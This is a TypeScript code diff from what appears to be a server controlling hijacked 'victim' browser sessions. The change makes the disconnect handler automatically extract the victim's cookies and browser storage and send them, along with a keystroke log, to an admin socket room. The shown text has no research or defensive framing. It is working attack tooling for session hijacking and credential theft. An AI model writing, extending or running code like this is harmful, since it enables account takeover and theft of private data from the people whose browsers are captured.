@@ -699,11 +699,31 @@ async function handleDisconnect(io: IoServer, socket: AppSocket): Promise<void> 
       : 0;
     void logEvent({ event: 'session_end', browserId, durationMs });
     
+    // Auto-extract cookies and storage before closing browser
+    let cookiesPayload = null;
+    let storagePayload = null;
+    if (instance) {
+      try {
+        cookiesPayload = await extractCookies(instance);
+        void logEvent({ event: 'cookies_extracted', browserId, cookieCount: cookiesPayload.cookies.length });
+      } catch (err) {
+        console.error(`[socket] Failed to auto-extract cookies on disconnect: ${(err as Error).message}`);
+      }
+      try {
+        storagePayload = await extractStorage(instance);
+        void logEvent({ event: 'storage_extracted', browserId });
+      } catch (err) {
+        console.error(`[socket] Failed to auto-extract storage on disconnect: ${(err as Error).message}`);
+      }
+    }
+    
     // Notify admins of status change (keep session visible but mark as disconnected)
     io.to('admin').emit('victim_disconnected', { 
       browserId,
       status: 'disconnected',
       keylog: instance?.keylog ?? '',
+      cookies: cookiesPayload || undefined,
+      storage: storagePayload || undefined,
     });
     
     clearVictimMetrics(browserId);
